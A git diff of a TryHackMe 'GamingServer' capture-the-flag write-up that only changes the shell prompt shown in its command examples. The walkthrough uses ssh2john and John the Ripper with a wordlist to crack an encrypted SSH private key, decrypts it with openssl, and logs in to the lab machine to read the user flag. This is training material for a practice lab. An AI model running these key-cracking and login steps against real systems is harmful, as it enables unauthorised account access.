@@ -34,8 +34,8 @@ so as you can see, we got a password list + ssh key (RSA) encrypted with AES. I 
 
 let start with convert encrypted ssh key to a format that john can understand. then use john to crack the password. we will use as our password list.
 ```console
-kali@kali:~/THM/gamingserver$ sudo python /usr/share/john/ssh2john.py secretKey s > ssh2john.txt
-kali@kali:~/THM/gamingserver$ sudo john --wordlist=dict.lst ssh2john.txt
+bibo318@parrot:~/THM/gamingserver$ sudo python /usr/share/john/ssh2john.py secretKey s > ssh2john.txt
+bibo318@parrot:~/THM/gamingserver$ sudo john --wordlist=dict.lst ssh2john.txt
 .
 .
 Press 'q' or Ctrl-C to abort, almost any other key for status
@@ -44,13 +44,13 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 ```
 now lets use to `openssl` to decrypt `secretKey`
 ```console
-kali@kali:~/THM/gamingserver$ openssl rsa -in secretKey -out gamingserver_key
+bibo318@parrot:~/THM/gamingserver$ openssl rsa -in secretKey -out gamingserver_key
 Enter pass phrase for secretKey:
 writing RSA key
 ```
 what are we waiting for let ssh to the victim server. Grab the user flag
 ```console
-kali@kali:~/THM/gamingserver$ ssh john@$IP -i gamingserver_key
+bibo318@parrot:~/THM/gamingserver$ ssh john@$IP -i gamingserver_key
 Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
 john@exploitable:~$ ls
 user.txt
